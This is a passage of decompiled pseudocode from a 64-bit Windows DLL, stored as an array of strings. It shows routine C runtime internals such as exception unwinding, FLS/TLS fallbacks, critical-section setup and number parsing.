    "  ++*(_DWORD *)(v16 + 48);",
    "  v17 = (_QWORD *)(a2 + 8);",
    "  v40 = v17;",
    "  v18 = 0;",
    "  v48 = 0;",
    "  v49 = 0;",
    "  if ( *(_DWORD *)(a3 + 8) )",
    "  {",
    "    v19 = (_BYTE *)(*v17 + *(int *)(a3 + 8));",
    "    v20 = *v19 & 0xF;",
    "    v18 = &v19[-byte_18003AB58[v20]];",
    "    v47 = *((_DWORD *)v18 - 1) >> byte_18003AB58[v20 + 16];",
    "    v48 = v18;",
    "  }",
    "  else",
    "  {",
    "    v47 = 0;",
    "  }",
    "  *(_QWORD *)&v32 = &v47;",
    "  *((_QWORD *)&v32 + 1) = v18;",
    "  v36 = &v47;",
    "  v37 = v18;",
    "  sub_180016BF0((unsigned int)&v47, v9, a4, (unsigned int)&v32, (__int64)&v36);",
    "  while ( 1 )",
    "  {",
    "    v43 = &v47;",
    "    v44 = v48;",
    "    v22 = *((_QWORD *)&v32 + 1);",
    "    if ( *((_QWORD *)&v32 + 1) < (unsigned __int64)v48 || *((_QWORD *)&v32 + 1) <= (unsigned __int64)v37 )",
    "      break;",
    "    sub_180016B38(v32, (char *)&v32 + 8);",
    "    *((_QWORD *)&v32 + 1) = v22;",
    "    v23 = v32;",
    "    v46 = *(__m128i *)(v32 + 16);",
    "    v24 = v46;",
    "    v45 = v32;",
    "    sub_180016B38(v32, (char *)&v32 + 8);",
    "    *((_QWORD *)&v32 + 1) = v22 - *(unsigned int *)(v23 + 16);",
    "    v9 = sub_180016CC0((unsigned int)&v36, a4, (unsigned int)&v45, v9, (__int64)&v32);",
    "    v34 = v9;",
    "    v33 = 0;",
    "    v25 = 0;",
    "    v26 = _mm_cvtsi128_si32(_mm_srli_si128(v24, 8));",
    "    v21 = (unsigned int)_mm_cvtsi128_si32(_mm_srli_si128(v24, 4));",
    "    if ( (_DWORD)v21 )",
    "      v25 = v26;",
    "    v33 = v25;",
    "    if ( v25 )",
    "    {",
    "      *v10 = v9 + 2;",
    "      if ( (unsigned int)(v21 - 1) <= 1 )",
    "      {",
    "        v27 = *v38;",
    "        v28 = _mm_srli_si128(v24, 12);",
    "        if ( (_DWORD)v21 == 2 )",
    "          v29 = *(_QWORD *)((unsigned int)_mm_cvtsi128_si32(v28) + v27);",
    "        else",
    "          v29 = v27 + (unsigned int)_mm_cvtsi128_si32(v28);",
    "        sub_180017250(*v17 + v25, v27, v29, 259);",
    "      }",
    "      else",
    "      {",
    "        CallSettingFrame(*v17 + v25, a1, 259);",
    "      }",
    "      sub_1800132F4(v39);",
    "    }",
    "  }",
    "  result = sub_180013A9C(v21);",
    "  if ( *(int *)(result + 48) > 0 )",
    "  {",
    "    result = sub_180013A9C(v31);",
    "    --*(_DWORD *)(result + 48);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180016928(unsigned __int64 *a1, struct _xDISPATCHER_CONTEXT *a2, struct _s_FuncInfo *a3)",
    "{",
    "  unsigned int v6; // ebx",
    "  __int64 v8; // [rsp+48h] [rbp+20h] BYREF",
    "",
    "  v6 = sub_180013CD0((__int64)a3, a2);",
    "  sub_180012AC0(a1, (ULONG64 *)a2, (__int64)a3, &v8);",
    "  if ( (int)v6 <= (int)__GetUnwindTryBlock(a1, a2, a3) )",
    "  {",
    "    return (unsigned int)__GetUnwindTryBlock(a1, a2, a3);",
    "  }",
    "  else",
    "  {",
    "    sub_180013C88(&v8, a3, v6);",
    "    sub_180013C94(a1, (ULONG64 *)a2, (__int64)a3, v6);",
    "  }",
    "  return v6;",
    "}",
    "",
    "",
    "char __fastcall sub_1800169C0(__int64 a1, _DWORD *a2, __int64 a3, __int64 a4)",
    "{",
    "  char v6; // r15",
    "  int i; // esi",
    "  int *v8; // r12",
    "  int v9; // r14d",
    "  __int64 v10; // rax",
    "  _BYTE *v11; // rbx",
    "  __int64 v12; // rdi",
    "  __int64 v13; // rax",
    "",
    "  if ( !a2 )",
    "    sub_1800219B0(a1, 0, a3, a4);",
    "  v6 = 0;",
    "  for ( i = 0; i < *a2; ++i )",
    "  {",
    "    v8 = (int *)(sub_1800132E0() + *(int *)(*(_QWORD *)(a1 + 48) + 12LL) + 4LL);",
    "    v9 = *(_DWORD *)(sub_1800132E0() + *(int *)(*(_QWORD *)(a1 + 48) + 12LL));",
    "    if ( v9 > 0 )",
    "    {",
    "      while ( 1 )",
    "      {",
    "        v10 = sub_1800132E0();",
    "        v11 = *(_BYTE **)(a1 + 48);",
    "        v12 = *v8 + v10;",
    "        v13 = sub_1800132CC();",
    "        if ( (unsigned int)sub_1800154A0(v13 + 20LL * i + (int)a2[1], v12, v11) )",
    "          break;",
    "        --v9;",
    "        ++v8;",
    "        if ( v9 <= 0 )",
    "          goto LABEL_8;",
    "      }",
    "      v6 = 1;",
    "    }",
    "LABEL_8:",
    "    ;",
    "  }",
    "  return v6;",
    "}",
    "",
    "",
    "char __fastcall sub_180016AB0(int *a1)",
    "{",
    "  int v1; // ebp",
    "  __int64 i; // rsi",
    "  __int64 v4; // rbx",
    "  __int64 v5; // rax",
    "",
    "  v1 = 0;",
    "  if ( *a1 <= 0 )",
    "    return 0;",
    "  for ( i = 0; ; i += 20 )",
    "  {",
    "    if ( *(_DWORD *)(a1[1] + i + sub_1800132CC() + 4) )",
    "    {",
    "      v4 = *(int *)(a1[1] + i + sub_1800132CC() + 4);",
    "      v5 = v4 + sub_1800132CC();",
    "    }",
    "    else",
    "    {",
    "      v5 = 0;",
    "    }",
    "    if ( !(unsigned int)sub_1800139E0(v5 + 8, &qword_18004BD80) )",
    "      break;",
    "    if ( ++v1 >= *a1 )",
    "      return 0;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180016B38(_DWORD *a1, __int64 *a2)",
    "{",
    "  __int64 v4; // rcx",
    "  _DWORD *v5; // r8",
    "  unsigned int v6; // eax",
    "  int v7; // ecx",
    "  __int64 result; // rax",
    "  int v9; // ecx",
    "  int v10; // ecx",
    "  _DWORD *v11; // rdx",
    "  __int64 v12; // rcx",
    "  _DWORD *v13; // rdx",
    "",
    "  v4 = *(_BYTE *)*a2 & 0xF;",
    "  v5 = (_DWORD *)(*a2 - byte_18003AB58[v4]);",
    "  v6 = *(v5 - 1) >> byte_18003AB58[v4 + 16];",
    "  *a2 = (__int64)v5;",
    "  v7 = v6 & 3;",
    "  a1[4] = v6 >> 2;",
    "  a1[5] = v7;",
    "  result = (unsigned int)(v7 - 1);",
    "  if ( (unsigned int)result <= 1 )",
    "  {",
    "    v10 = *(_DWORD *)*a2;",
    "    *a2 += 4;",
    "    a1[6] = v10;",
    "    v11 = (_DWORD *)*a2;",
    "    v12 = *(_BYTE *)v11 & 0xF;",
    "    v13 = (_DWORD *)((char *)v11 - byte_18003AB58[v12]);",
    "    result = (unsigned int)(*(v13 - 1) >> byte_18003AB58[v12 + 16]);",
    "    *a2 = (__int64)v13;",
    "    a1[7] = result;",
    "  }",
    "  else if ( v7 == 3 )",
    "  {",
    "    v9 = *(_DWORD *)*a2;",
    "    result = *a2 + 4;",
    "    *a2 = result;",
    "    a1[6] = v9;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180016BD4(__int64 a1, __int64 (__fastcall *a2)(__int64, __int64), __int64 a3)",
    "{",
    "  return a2(a1, a3);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180016BE0(",
    "        __int64 a1,",
    "        __int64 (__fastcall *a2)(__int64, __int64, _QWORD),",
    "        __int64 a3,",
    "        unsigned int a4)",
    "{",
    "  return a2(a1, a3, a4);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180016BF0(__int64 a1, int a2, int a3, __int64 a4, __int64 a5)",
    "{",
    "  __int64 v5; // rax",
    "  char v6; // bp",
    "  char v7; // r14",
    "  int v8; // edi",
    "  __int64 v9; // r12",
    "  __int64 v12; // rsi",
    "  __int64 v13; // r15",
    "  int v14; // r12d",
    "  _OWORD *v15; // rax",
    "  __int64 result; // rax",
    "  _OWORD *v17; // rcx",
    "  __int64 v18; // [rsp+60h] [rbp+8h] BYREF",
    "  int v19; // [rsp+68h] [rbp+10h]",
    "  __int64 v20; // [rsp+78h] [rbp+20h]",
    "",
    "  v20 = a4;",
    "  v19 = a2;",
    "  v5 = *(_QWORD *)(a1 + 8);",
    "  v6 = 0;",
    "  v7 = 0;",
    "  v18 = v5;",
    "  v8 = 0;",
    "  v9 = a4;",
    "  v12 = v5 - 1;",
    "  v13 = v5 - 1;",
    "  if ( *(int *)a1 > 0 )",
    "  {",
    "    v14 = v19;",
    "    while ( 1 )",
    "    {",
    "      if ( v8 == v14 )",
    "      {",
    "        v12 = v5;",
    "        v6 = 1;",
    "      }",
    "      if ( v8 == a3 )",
    "      {",
    "        v13 = v5;",
    "        v7 = 1;",
    "      }",
    "      if ( v6 && v7 )",
    "        break;",
    "      sub_180016B38((_DWORD *)a1, &v18);",
    "      if ( ++v8 >= *(_DWORD *)a1 )",
    "        break;",
    "      v5 = v18;",
    "    }",
    "    v9 = v20;",
    "  }",
    "  v15 = *(_OWORD **)v9;",
    "  *(_QWORD *)(v9 + 8) = v12;",
    "  *v15 = *(_OWORD *)a1;",
    "  v15[1] = *(_OWORD *)(a1 + 16);",
    "  result = a5;",
    "  v17 = *(_OWORD **)a5;",
    "  *(_QWORD *)(a5 + 8) = v13;",
    "  *v17 = *(_OWORD *)a1;",
    "  v17[1] = *(_OWORD *)(a1 + 16);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180016CC0(__int128 *a1, unsigned int a2, __int64 a3, unsigned int a4, __int128 *a5)",
    "{",
    "  unsigned __int64 v7; // rdx",
    "  __int128 v9; // [rsp+20h] [rbp-18h] BYREF",
    "",
    "  v7 = *((_QWORD *)a5 + 1);",
    "  if ( v7 > *(_QWORD *)(a3 + 8) || *((_QWORD *)a1 + 1) > v7 )",
    "    return 0xFFFFFFFFLL;",
    "  if ( (__int64)(v7 - *((_QWORD *)a1 + 1)) >= (__int64)(*(_QWORD *)(a3 + 8) - v7) )",
    "  {",
    "    a2 = a4;",
    "    v9 = *a5;",
    "    if ( *(_QWORD *)(a3 + 8) > v7 )",
    "    {",
    "      do",
    "      {",
    "        sub_180016B38((_DWORD *)v9, (__int64 *)&v9 + 1);",
    "        --a2;",
    "      }",
    "      while ( *(_QWORD *)(a3 + 8) > *((_QWORD *)&v9 + 1) );",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v9 = *a1;",
    "    if ( v7 > *((_QWORD *)a1 + 1) )",
    "    {",
    "      do",
    "      {",
    "        sub_180016B38((_DWORD *)v9, (__int64 *)&v9 + 1);",
    "        ++a2;",
    "      }",
    "      while ( *((_QWORD *)a5 + 1) > *((_QWORD *)&v9 + 1) );",
    "    }",
    "  }",
    "  return a2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180016DA0(__int64 a1, __int64 a2, __int64 a3)",
    "{",
    "  return nullsub_2(a1, a2, a3, 429065504);",
    "}",
    "",
    "",
    "void nullsub_2()",
    "{",
    "  ;",
    "}",
    "",
    "",
    "void nullsub_1()",
    "{",
    "  ;",
    "}",
    "",
    "",
    "struct _TEB *__fastcall sub_180016DD4(__int64 a1)",
    "{",
    "  struct _TEB *result; // rax",
    "  PVOID v2; // rcx",
    "",
    "  result = (struct _TEB *)_guard_check_icall_fptr;",
    "  if ( _guard_check_icall_fptr != (_UNKNOWN *)guard_check_icall_nop )",
    "  {",
    "    result = NtCurrentTeb();",
    "    v2 = *(PVOID *)(a1 + 152);",
    "    if ( v2 < result->NtTib.StackLimit || v2 > result->NtTib.StackBase )",
    "      __fastfail(0xDu);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "char sub_180016E0C()",
    "{",
    "  __int64 v0; // rbx",
    "",
    "  v0 = 0;",
    "  while ( (unsigned int)sub_180017108((LPCRITICAL_SECTION)&unk_18004D1F8 + v0, (PCONTEXT)0xFA0) )",
    "  {",
    "    ++dword_18004D220;",
    "    v0 = (unsigned int)(v0 + 1);",
    "    if ( (_DWORD)v0 )",
    "      return 1;",
    "  }",
    "  sub_180016E54();",
    "  return 0;",
    "}",
    "",
    "",
    "char sub_180016E54()",
    "{",
    "  int v0; // ebx",
    "",
    "  v0 = dword_18004D220;",
    "  while ( v0 )",
    "  {",
    "    DeleteCriticalSection((LPCRITICAL_SECTION)&unk_18004D1F8 + (unsigned int)--v0);",
    "    --dword_18004D220;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "FARPROC __fastcall sub_180016E8C(unsigned int a1, const CHAR *a2, unsigned int *a3, unsigned int *a4)",
    "{",
    "  __int64 v4; // rdi",
    "  unsigned int *v6; // rbp",
    "  FARPROC result; // rax",
    "  __int64 v9; // rsi",
    "  HMODULE Library; // rbx",
    "  const WCHAR *v11; // r15",
    "",
    "  v4 = a1;",
    "  v6 = a3;",
    "  result = (FARPROC)qword_18004D2A8[a1];",
    "  if ( result == (FARPROC)-1LL )",
    "    return 0;",
    "  if ( !result )",
    "  {",
    "    if ( a3 == a4 )",
    "      goto LABEL_13;",
    "    while ( 1 )",
    "    {",
    "      v9 = *v6;",
    "      Library = (HMODULE)qword_18004D290[v9];",
    "      if ( Library )",
    "      {",
    "        if ( Library != (HMODULE)-1LL )",
    "          goto LABEL_18;",
    "      }",
    "      else",
    "      {",
    "        v11 = off_18003BAC0[v9];",
    "        Library = LoadLibraryExW(v11, 0, 0x800u);",
    "        if ( Library",
    "          || GetLastError() == 87",
    "          && (unsigned int)sub_1800232D0(v11, L\"api-ms-\", 7)",
    "          && (Library = LoadLibraryExW(v11, 0, 0)) != 0 )",
    "        {",
    "          if ( _InterlockedExchange64(&qword_18004D290[v9], (__int64)Library) )",
    "            FreeLibrary(Library);",
    "LABEL_18:",
    "          result = GetProcAddress(Library, a2);",
    "          if ( result )",
    "          {",
    "            _InterlockedExchange64(&qword_18004D2A8[v4], (__int64)result);",
    "            return result;",
    "          }",
    "LABEL_13:",
    "          _InterlockedExchange64(&qword_18004D2A8[v4], -1);",
    "          return 0;",
    "        }",
    "        _InterlockedExchange64(&qword_18004D290[v9], -1);",
    "      }",
    "      if ( ++v6 == a4 )",
    "        goto LABEL_13;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "DWORD __fastcall sub_180016FDC(__int64 a1)",
    "{",
    "  FARPROC v2; // rax",
    "",
    "  v2 = sub_180016E8C(0, \"FlsAlloc\", (unsigned int *)&unk_18003BB80, (unsigned int *)\"FlsAlloc\");",
    "  if ( v2 )",
    "    return ((__int64 (__fastcall *)(__int64))v2)(a1);",
    "  else",
    "    return TlsAlloc();",
    "}",
    "",
    "",
    "int __fastcall sub_180017024(DWORD a1)",
    "{",
    "  FARPROC v2; // rax",
    "",
    "  v2 = sub_180016E8C(1u, \"FlsFree\", (unsigned int *)&unk_18003BB98, (unsigned int *)\"FlsFree\");",
    "  if ( v2 )",
    "    return ((__int64 (__fastcall *)(_QWORD))v2)(a1);",
    "  else",
    "    return TlsFree(a1);",
    "}",
    "",
    "",
    "LPVOID __fastcall sub_18001706C(DWORD a1)",
    "{",
    "  FARPROC v2; // rax",
    "",
    "  v2 = sub_180016E8C(2u, \"FlsGetValue\", (unsigned int *)&unk_18003BBA8, (unsigned int *)\"FlsGetValue\");",
    "  if ( v2 )",
    "    return (LPVOID)((__int64 (__fastcall *)(_QWORD))v2)(a1);",
    "  else",
    "    return TlsGetValue(a1);",
    "}",
    "",
    "",
    "int __fastcall sub_1800170B4(PCONTEXT dwTlsIndex, XSAVE_FORMAT *lpTlsValue)",
    "{",
    "  DWORD v3; // edi",
    "  FARPROC v4; // rax",
    "",
    "  v3 = (unsigned int)dwTlsIndex;",
    "  v4 = sub_180016E8C(3u, \"FlsSetValue\", (unsigned int *)&unk_18003BBC0, (unsigned int *)\"FlsSetValue\");",
    "  if ( v4 )",
    "    return ((__int64 (__fastcall *)(_QWORD, XSAVE_FORMAT *))v4)(v3, lpTlsValue);",
    "  else",
    "    return TlsSetValue(v3, lpTlsValue);",
    "}",
    "",
    "",
    "int __fastcall sub_180017108(LPCRITICAL_SECTION lpCriticalSection, PCONTEXT dwSpinCount, unsigned int a3)",
    "{",
    "  DWORD v4; // ebx",
    "  FARPROC v6; // rax",
    "",
    "  v4 = (unsigned int)dwSpinCount;",
    "  v6 = sub_180016E8C(",
    "         4u,",
    "         \"InitializeCriticalSectionEx\",",
    "         (unsigned int *)&unk_18003BBD8,",
    "         (unsigned int *)\"InitializeCriticalSectionEx\");",
    "  if ( v6 )",
    "    return ((__int64 (__fastcall *)(LPCRITICAL_SECTION, _QWORD, _QWORD))v6)(lpCriticalSection, v4, a3);",
    "  else",
    "    return InitializeCriticalSectionAndSpinCount(lpCriticalSection, v4);",
    "}",
    "",
    "",
    "__int64 __fastcall CallSettingFrame(__int64 a1, __int64 *a2, __int64 a3)",
    "{",
    "  void (*v3)(void); // rax",
    "  __int64 v4; // rax",
    "",
    "  v3 = (void (*)(void))sub_180016DA0(a1, *a2, a3);",
    "  v3();",
    "  nullsub_1();",
    "  return sub_180016DA0(v4, *a2, 2);",
    "}",
    "",
    "",
    "void __fastcall CallSettingFrame_0(__int64 a1, __int64 *a2, __int64 a3)",
    "{",
    "  void (*v3)(void); // rax",
    "",
    "  v3 = (void (*)(void))sub_180016DA0(a1, *a2, a3);",
    "  v3();",
    "  nullsub_1();",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180017220(__int64 a1, __int64 *a2)",
    "{",
    "  return sub_180016DA0(a1, *a2, 2);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180017250(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)",
    "{",
    "  void (__fastcall *v4)(__int64); // rax",
    "  __int64 v5; // rax",
    "",
    "  v4 = (void (__fastcall *)(__int64))sub_180016DA0(a1, a2, a4);",
    "  v4(a3);",
    "  nullsub_1();",
    "  return sub_180016DA0(v5, a2, 2);",
    "}",
    "",
    "",
    "__int64 sub_180017298()",
    "{",
    "  int v0; // eax",
    "  __int64 v1; // rbx",
    "  __int64 v2; // rdi",
    "  __int64 v4; // rbp",
    "  _DWORD *v5; // rsi",
    "  char *v6; // r14",
    "",
    "  v0 = dword_18004D2D0;",
    "  v1 = 0;",
    "  v2 = 3;",
    "  if ( dword_18004D2D0 )",
    "  {",
    "    if ( dword_18004D2D0 < 3 )",
    "      v0 = 3;",
    "  }",
    "  else",
    "  {",
    "    v0 = 512;",
    "  }",
    "  dword_18004D2D0 = v0;",
    "  *(_QWORD *)&qword_18004D2D8.ControlWord = sub_1800232FC(v0, 8);",
    "  sub_180023374(0);",
    "  if ( !*(_QWORD *)&qword_18004D2D8.ControlWord )",
    "  {",
    "    dword_18004D2D0 = 3;",
    "    *(_QWORD *)&qword_18004D2D8.ControlWord = sub_1800232FC(3, 8);",
    "    sub_180023374(0);",
    "    if ( !*(_QWORD *)&qword_18004D2D8.ControlWord )",
    "      return 0xFFFFFFFFLL;",
    "  }",
    "  v4 = 0;",
    "  v5 = &unk_18004B118;",
    "  v6 = (char *)&unk_18004B100;",
    "  do",
    "  {",
    "    sub_180023878((LPCRITICAL_SECTION)(v6 + 48), (PCONTEXT)0xFA0);",
    "    *(_QWORD *)(v1 + *(_QWORD *)&qword_18004D2D8.ControlWord) = v6;",
    "    if ( *(_QWORD *)(qword_18004D870[v4 >> 6] + 72 * (v4 & 0x3F) + 40) >= 0xFFFFFFFFFFFFFFFEuLL",
    "      || *(_QWORD *)(qword_18004D870[v4 >> 6] + 72 * (v4 & 0x3F) + 40) == 0 )",
    "    {",
    "      *v5 = -2;",
    "    }",
    "    ++v4;",
    "    v6 += 88;",
    "    v1 += 8;",
    "    v5 += 22;",
    "    --v2;",
    "  }",
    "  while ( v2 );",
    "  return 0;",
    "}",
    "",
    "",
    "char *__fastcall sub_1800173B8(unsigned int a1)",
    "{",
    "  return (char *)&unk_18004B100 + 88 * a1;",
    "}",
    "",
    "",
    "__int64 sub_1800173CC()",
    "{",
    "  __int64 i; // rbx",
    "  __int64 result; // rax",
    "",
    "  sub_18001F540();",
    "  sub_180023D10();",
    "  for ( i = 0; i != 24; i += 8 )",
    "  {",
    "    sub_180023DC4(*(_QWORD *)(i + *(_QWORD *)&qword_18004D2D8.ControlWord));",
    "    DeleteCriticalSection((LPCRITICAL_SECTION)(*(_QWORD *)(i + *(_QWORD *)&qword_18004D2D8.ControlWord) + 48LL));",
    "  }",
    "  result = sub_180023374(*(XSAVE_FORMAT **)&qword_18004D2D8.ControlWord);",
    "  *(_QWORD *)&qword_18004D2D8.ControlWord = 0;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180017428(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4)",
    "{",
    "  if ( a1 )",
    "  {",
    "    if ( a2 )",
    "      *a2 = a1 + 8;",
    "    if ( a3 )",
    "      *a3 = a1;",
    "    if ( a4 )",
    "      *a4 = a1 + 16;",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C(0, a2) = 22;",
    "    invalid_parameter_noinfo();",
    "    return 22;",
    "  }",
    "}",
    "",
    "",
    "__m128 __fastcall sub_180017488(__int64 a1, _DWORD *a2)",
    "{",
    "  __m128 result; // xmm0",
    "  __m128 v3; // xmm6",
    "  __int64 v5; // rax",
    "  __int64 v6; // rdi",
    "  __int64 v7; // rcx",
    "  int v8; // eax",
    "  int v9; // r8d",
    "  int v10; // r9d",
    "  int v11; // ecx",
    "",
    "  v3 = result;",
    "  if ( !a2 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C(a1, 0) = 22;",
    "    invalid_parameter_noinfo();",
    "    return (__m128)0LL;",
    "  }",
    "  v5 = ctrlfp(8064, 65472);",
    "  v7 = result.m128_u16[3];",
    "  v6 = v5;",
    "  LOWORD(v7) = result.m128_i16[3] & 0x7FF0;",
    "  if ( (result.m128_i16[3] & 0x7FF0) == 0x7FF0 )",
    "  {",
    "    *a2 = -1;",
    "    v8 = sub_180024A08() - 1;",
    "    if ( v8 && (unsigned int)(v8 - 1) >= 2 )",
    "    {",
    "      v11 = 8;",
    "LABEL_7:",
    "      sub_1800240C0(v11, 23, v9, v10, v6);",
    "      return result;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    if ( *(double *)result.m128_u64 == 0.0 && (unsigned int)unknown_libname_3() )",
    "    {",
    "      *a2 = 0;",
    "      v11 = 0;",
    "      goto LABEL_7;",
    "    }",
    "    *(double *)result.m128_u64 = sub_1800248D8(v7, a2);",
    "    v3 = result;",
    "  }",
    "  ctrlfp(v6, 65472);",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180017580(__int64 a1, _QWORD *a2, __int64 a3, _QWORD *a4)",
    "{",
    "  sub_180017470(*a2);",
    "  LODWORD(a3) = sub_18001841C(a3);",
    "  sub_18001747C(*a4);",
    "  return (unsigned int)a3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800175C0(__int64 a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, __int64 a5, __int64 a6)",
    "{",
    "  char v8; // r15",
    "  int v10; // eax",
    "  unsigned __int64 v11; // rbx",
    "  __int64 v12; // rax",
    "  _QWORD v13[2]; // [rsp+30h] [rbp-D0h] BYREF",
    "  __int64 v14; // [rsp+40h] [rbp-C0h]",
    "  char v15; // [rsp+48h] [rbp-B8h]",
    "  int v16; // [rsp+49h] [rbp-B7h]",
    "  __int16 v17; // [rsp+4Dh] [rbp-B3h]",
    "  char v18; // [rsp+4Fh] [rbp-B1h]",
    "  _QWORD v19[4]; // [rsp+50h] [rbp-B0h] BYREF",
    "  int v20; // [rsp+70h] [rbp-90h]",
    "  char v21; // [rsp+74h] [rbp-8Ch]",
    "  __int64 v22; // [rsp+78h] [rbp-88h]",
    "  int v23; // [rsp+80h] [rbp-80h]",
    "  __int16 v24; // [rsp+88h] [rbp-78h]",
    "  int v25; // [rsp+98h] [rbp-68h]",
    "  char v26; // [rsp+9Ch] [rbp-64h]",
    "  __int128 lpMem; // [rsp+4A0h] [rbp+3A0h]",
    "  _QWORD *v28; // [rsp+4B0h] [rbp+3B0h]",
    "  int v29; // [rsp+4B8h] [rbp+3B8h]",
    "",
    "  v8 = a1;",
    "  if ( !a4 || a3 && !a2 )",
    "  {",
    "    *(_BYTE *)(a5 + 48) = 1;",
    "    *(_DWORD *)(a5 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a5);",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  v16 = 0;",
    "  v17 = 0;",
    "  v18 = 0;",
    "  v13[0] = a2;",
    "  v13[1] = a3;",
    "  v14 = 0;",
    "  if ( (a1 & 2) != 0 || (v15 = 0, !a2) )",
    "    v15 = 1;",
    "  v19[1] = a5;",
    "  v20 = 0;",
    "  v28 = v13;",
    "  v19[3] = a6;",
    "  v21 = 0;",
    "  v22 = 0;",
    "  v23 = 0;",
    "  v24 = 0;",
    "  v25 = 0;",
    "  v26 = 0;",
    "  lpMem = 0;",
    "  v19[0] = a1;",
    "  v19[2] = a4;",
    "  v29 = 0;",
    "  v10 = sub_180018A40(v19);",
    "  v11 = v10;",
    "  if ( a2 )",
    "  {",
    "    if ( (v8 & 1) != 0 )",
    "    {",
    "      if ( !a3 && v10 )",
    "        goto LABEL_12;",
    "      v12 = v14;",
    "      if ( v14 == a3 )",
    "      {",
    "        if ( (v11 & 0x80000000) != 0LL || v11 <= a3 )",
    "          goto LABEL_23;",
    "        goto LABEL_12;",
    "      }",
    "      goto LABEL_22;",
    "    }",
    "    if ( (v8 & 2) != 0 )",
    "    {",
    "      if ( !a3 )",
    "        goto LABEL_23;",
    "      if ( v10 < 0 )",
    "      {",
    "        *a2 = 0;",
    "        goto LABEL_23;",
    "      }",
    "      v12 = v14;",
    "      if ( v14 != a3 )",
    "        goto LABEL_22;",
    "    }",
    "    else",
    "    {",
    "      if ( !a3 )",
    "      {",
    "LABEL_12:",
    "        LODWORD(v11) = -1;",
    "        goto LABEL_23;",
    "      }",
    "      v12 = v14;",
    "      if ( v14 != a3 )",
    "      {",
    "LABEL_22:",
    "        a2[v12] = 0;",
    "        goto LABEL_23;",
    "      }",
    "      LODWORD(v11) = -2;",
    "    }",
    "    a2[a3 - 1] = 0;",
    "  }",
    "LABEL_23:",
    "  sub_180023374(*((XSAVE_FORMAT **)&lpMem + 1));",
    "  return (unsigned int)v11;",
    "}",
    "",
    "",
    "char __fastcall sub_180017770(__int64 a1, unsigned __int64 a2, __int64 a3)",
    "{",
    "  char result; // al",
    "  char v5; // di",
    "  unsigned __int64 v6; // rsi",
    "  __int64 v7; // rbx",
    "",
    "  if ( a2 <= 0x7FFFFFFFFFFFFFFFLL )",
    "  {",
    "    v5 = 0;",
    "    v6 = 2 * a2;",
    "    if ( (*(_QWORD *)(a1 + 1032) || v6 > 0x400) && v6 > *(_QWORD *)(a1 + 1024) )",
    "    {",
    "      v7 = sub_180024B50(2 * a2);",
    "      if ( v7 )",
    "      {",
    "        sub_180023374(*(XSAVE_FORMAT **)(a1 + 1032));",
    "        *(_QWORD *)(a1 + 1032) = v7;",
    "        v5 = 1;",
    "        *(_QWORD *)(a1 + 1024) = v6;",
    "      }",
    "      sub_180023374(0);",
    "      return v5;",
    "    }",
    "    else",
    "    {",
    "      return 1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(a3 + 48) = 1;",
    "    result = 0;",
    "    *(_DWORD *)(a3 + 44) = 12;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180017818(__int64 a1, char **a2, unsigned int a3, unsigned __int8 a4)",
    "{",
    "  char *v4; // r12",
    "  unsigned int v5; // ebp",
    "  char **v6; // rbx",
    "  char **v8; // rcx",
    "  char v9; // si",
    "  char *v10; // rcx",
    "  unsigned int v11; // r14d",
    "  int v12; // edi",
    "  int v13; // eax",
    "  int v14; // eax",
    "  int v15; // eax",
    "  char *v16; // r8",
    "  __int64 v17; // rdx",
    "  unsigned int v18; // r9d",
    "  __int64 v19; // rcx",
    "  BOOL v20; // ecx",
    "  bool v21; // cf",
    "  bool v22; // zf",
    "  char **v23; // rax",
    "  int v25; // eax",
    "  int v26; // ecx",
    "  int v27; // edi",
    "  char **v28; // rdx",
    "  char **v29; // rax",
    "",
    "  v4 = *a2;",
    "  v5 = a3;",
    "  v6 = a2;",
    "  if ( !*a2 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C(a1, a2) = 22;",
    "    invalid_parameter_noinfo();",
    "    goto LABEL_6;",
    "  }",
    "  if ( a3 && a3 - 2 > 0x22 )",
    "  {",
    "    *(_BYTE *)(a1 + 48) = 1;",
    "    *(_DWORD *)(a1 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a1);",
    "LABEL_6:",
    "    v8 = (char **)v6[1];",
    "    if ( v8 )",
    "      *v8 = *v6;",
    "    return 0;",
    "  }",
    "  v9 = *v4;",
    "  v10 = v4 + 1;",
    "  v11 = 0;",
    "  *a2 = v4 + 1;",
    "  v12 = a4 | 2;",
    "  if ( v9 == 45 || (v12 = a4, v9 == 43) )",
    "  {",
    "    v9 = *v10;",
    "    v10 = v4 + 2;",
    "    *a2 = v4 + 2;",
    "  }",
    "  if ( (a3 & 0xFFFFFFEF) == 0 )",
    "  {",
    "    if ( (unsigned __int8)(v9 - 48) > 9u )",
    "    {",
    "      if ( (unsigned __int8)(v9 - 97) > 0x19u )",
    "      {",
    "        if ( (unsigned __int8)(v9 - 65) > 0x19u )",
    "          goto LABEL_26;",
    "        v13 = v9 - 55;",
    "      }",
    "      else",
    "      {",
    "        v13 = v9 - 87;",
    "      }",
    "    }",
